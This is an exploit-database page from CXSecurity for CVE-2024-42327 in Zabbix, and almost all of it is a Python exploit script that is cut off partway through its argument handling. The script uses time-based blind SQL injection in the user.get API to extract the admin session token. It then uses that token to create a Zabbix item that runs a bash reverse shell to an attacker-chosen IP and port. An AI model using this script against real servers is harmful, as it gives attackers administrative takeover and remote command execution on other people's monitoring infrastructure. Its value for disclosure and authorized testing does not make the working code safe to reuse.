---
title: Zabbix SQL Multiple Vulns
url: https://cxsecurity.com/issue/WLB-2025020012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-02-20
fetch_date: 2025-10-06T20:32:50.986217
---

# Zabbix SQL Multiple Vulns

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Zabbix SQL Multiple Vulns** **2025.02.19**  Credit:  **[godylockz](https://cxsecurity.com/author/godylockz/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-42327](https://cxsecurity.com/cveshow/CVE-2024-42327%20/ "Click to see CVE-2024-42327 ")**  CWE: **N/A** | |

#!/usr/bin/env python3
# -\*- coding: utf-8 -\*-
"""
This script is used to exploit CVE-2024-42327 affecting Zabbix servers to leak the admin API authentication token and create an item to achieve a reverse shell.
"""
# Imports
from concurrent.futures import ThreadPoolExecutor
from threading import Timer
import argparse
import netifaces
import os
import requests
import string
import sys
import urllib.parse
# Disable SSL self-signed certificate warnings
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable\_warnings(category=InsecureRequestWarning)
# Constants
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
ENDC = "\033[0m"
ENCODING = "UTF-8"
def zabbix\_authenticate():
"""Authenticate the user and retrieve the API token."""
payload = {"jsonrpc": "2.0", "method": "user.login", "params": {"username": args.username, "password": args.password}, "id": 1}
r = requests.post(url=args.url, json=payload, proxies=proxies, headers=headers, verify=False)
if r.status\_code == 200:
try:
response\_json = r.json()
auth\_token = response\_json.get("result")
if auth\_token:
print(f"[+] Login successful! {args.username} API auth token: {auth\_token}")
return auth\_token
else:
print(f"{RED}[-] Login failed. Response: {response\_json}{ENDC}")
exit()
except Exception as e:
print(f"{RED}[-] Error: {str(e)}{ENDC}")
exit()
else:
print(f"{RED}[-] HTTP request failed with status code {r.status\_code}{ENDC}")
exit()
def send\_injection(auth\_token, position, char):
"""Send an SQL injection payload and measure the response time."""
payload = {
"jsonrpc": "2.0",
"method": "user.get",
"params": {
"output": ["userid", "username"],
"selectRole": [
"roleid",
f"name AND (SELECT \* FROM (SELECT(SLEEP({args.sleep\_time} - "
f"(IF(ORD(MID((SELECT sessionid FROM zabbix.sessions "
f"WHERE userid=1 and status=0 LIMIT {args.row},1), "
f"{position}, 1))={ord(char)}, 0, {args.sleep\_time})))))BEEF)",
],
"editable": 1,
},
"auth": auth\_token,
"id": 1,
}
r = requests.post(url=args.url, json=payload, proxies=proxies, headers=headers, verify=False)
response\_time = r.elapsed.total\_seconds()
return char, response\_time
def extract\_api\_token\_parallel(auth\_token, position, charset=string.printable):
"""Extract the API token (multi-threaded)."""
with ThreadPoolExecutor(max\_workers=args.threads) as executor:
futures = {executor.submit(send\_injection, auth\_token, position, char): char for char in charset}
for future in futures:
char, response\_time = future.result()
if args.sleep\_time < response\_time < args.sleep\_time + 0.5:
return char
return None
def get\_host\_ids(api\_token\_admin):
"""Retrieve current host IDs and their associated interface IDs."""
payload = {"jsonrpc": "2.0", "method": "host.get", "params": {"output": ["hostid", "host"], "selectInterfaces": ["interfaceid"]}, "auth": api\_token\_admin, "id": 1}
response = requests.post(url=args.url, json=payload, proxies=proxies, headers=headers, verify=False)
if response.status\_code == 200:
try:
response\_json = response.json()
print(f"[\*] host.get response: {response\_json}")
result = response\_json.get("result", [])
if result:
host\_id = result[0]["hostid"]
interface\_id = result[0]["interfaces"][0]["interfaceid"]
return host\_id, interface\_id
else:
print(f"{RED}[-] No hosts found in the response.{ENDC}")
return None, None
except Exception as e:
print(f"{RED}[-] Error parsing response: {str(e)}{ENDC}")
return None, None
else:
print(f"{RED}[-] Failed to retrieve host IDs. HTTP status code: {response.status\_code}{ENDC}")
return None, None
def send\_reverse\_shell\_request(api\_token\_admin, host\_id, interface\_id):
"""Create an item with a reverse shell payload."""
payload = {
"jsonrpc": "2.0",
"method": "item.create",
"params": {
"name": "rce",
"key\_": f'system.run[bash -c "bash -i >& /dev/tcp/{args.listen\_ip}/{args.listen\_port} 0>&1"]',
"delay": 1,
"hostid": host\_id,
"type": 0,
"value\_type": 1,
"interfaceid": interface\_id,
},
"auth": api\_token\_admin,
"id": 1,
}
try:
requests.post(url=args.url, json=payload, proxies=proxies, headers=headers, verify=False)
except requests.exceptions.Timeout:
pass # Ignore timeout error
if \_\_name\_\_ == "\_\_main\_\_":
# Parse arguments
parser = argparse.ArgumentParser(description="POC for CVE-2024-42327 (Zabbix admin API token leak)")
parser.add\_argument("-t", "--url", help="Zabbix Target URL", required=True)
parser.add\_argument("-u", "--username", help="Zabbix username", required=True)
parser.add\_argument("-p", "--password", help="Zabbix password", required=True)
parser.add\_argument("--listen-ip", help="Listening IP / Interface", default="tun0")
parser.add\_argument("--listen-port", type=int, help="Listening Port", default=4444)
parser.add\_argument("--threads", type=int, help="Threads", default=10)
parser.add\_argument("--sleep-time", type=int, help="Sleep time", default=1)
parser.add\_argument("--row", type=int, help="Row index", default=0)
parser.add\_argument("--length", type=int, help="Max length", default=32)
parser.add\_argument(
"-a",
"--useragent",
type=str,
required=False,
help="User agent to use when sending requests",
default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
)
parser.add\_argument("-x", "--proxy", type=str, required=False, help="HTTP(s) proxy to use when sending requests (i.e. -p http://127.0.0.1:8080)")
parser.add\_argument("-v", "--verbose", action="store\_true", required=False, help="Verbosity enabled - additional output flag")
args = parser.parse\_args()
# Input-checking
if not args.url.startswith("http://") and not args.url.startswith("https://"):
args.url = "http://" + args.url
args.url = urllib.parse.urlparse(args.url).geturl().strip("/").replace("api\_jsonrpc.php", "") + "/api\_jsonrp...